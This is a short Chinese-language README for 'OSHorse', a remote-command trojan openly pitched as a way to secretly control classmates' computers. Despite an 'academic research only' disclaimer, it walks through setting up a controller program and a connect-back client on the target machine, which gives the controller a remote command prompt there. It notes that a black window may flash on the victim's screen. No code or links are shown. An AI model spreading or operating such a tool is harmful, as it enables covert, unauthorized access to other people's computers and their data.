# OSHorse，轻松控制同学电脑！
### 免责声明：仅供学术研究使用。对于违反相关法律、造成危害的滥用行为，开发者不负任何责任。
### Disclaimer: For academic research purposes only. Developers are not responsible for any abuse that violates relevant laws and causes harm.

## 有关这个项目
最近一直在找机会研究如何破解极域电子教室，结果百度了几下，看到某篇利用电子教室控制同学的教程。

呃，这似乎有点麻烦，不如自己写一个罢…？

来看看这个远程命令程序！

## 使用方法
1. 在控制机器上下载（链接附在文末）`HorseCommander.exe`，并在程序同一目录下新建文本文档，重命名为`connect.txt`，内容为连接端口（建议为8888或8080），然后打开程序。（切记，一定要先打开控制端！）
2. 在目标机器上下载`connecter.exe`，并在程序同一目录下新建文本文档，重命名为`connect.txt`，内容 第一行为控制机器的IP地址（输入`ipconfig`查看，一般格式为`192.168.*.*`），第二行为连接端口（与上文端口相同）。双击打开程序，目标机器可能会闪过一个黑框。
3. 回到控制机器，会显示连线者IP地址并显示提示符，您现在可以远程执行命令啦！

TIPS: 这个提示符的界面和cmd不一样，你可以执行`cd .`来查看目标机器上木马的工作目录，输入`help`查看木马内置命令。
